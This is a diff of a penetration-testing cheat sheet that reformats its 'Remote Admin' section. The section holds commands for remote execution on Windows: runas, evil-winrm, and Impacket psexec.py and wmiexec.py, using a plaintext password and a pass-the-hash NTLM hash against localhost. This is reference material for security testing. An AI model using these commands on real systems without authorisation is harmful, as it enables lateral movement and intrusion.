@@ -464,33 +464,37 @@ PS> type 'file.txt:Password'
 
 ### Remote Admin
 
-Runas (from Windows)
+#### runas
 
 ```
 PS> runas /netonly /user:snovvcrash powershell
 ```
 
-WinRM 5985 **[1]** (from Linux)
+#### evil-winrm.rb
 
 ```
 root@kali:$ ruby evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s ./ -e ./
 ```
 
-1. [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
+* [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
 
-PSExec (Impacket, from Linux)
+#### psexec.py
 
 ```
 root@kali:$ psexec.py snovvcrash:qwe123@127.0.0.1
 root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 ```
 
-WMIExec (Impacket, from Linux)
+* [github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
+
+#### wmiexec.py
 
 ```
 root@kali:$ wmiexec.py snovvcrash:qwe123@127.0.0.1
 root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 ```
+
+* [github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
 
 
 ### Registry
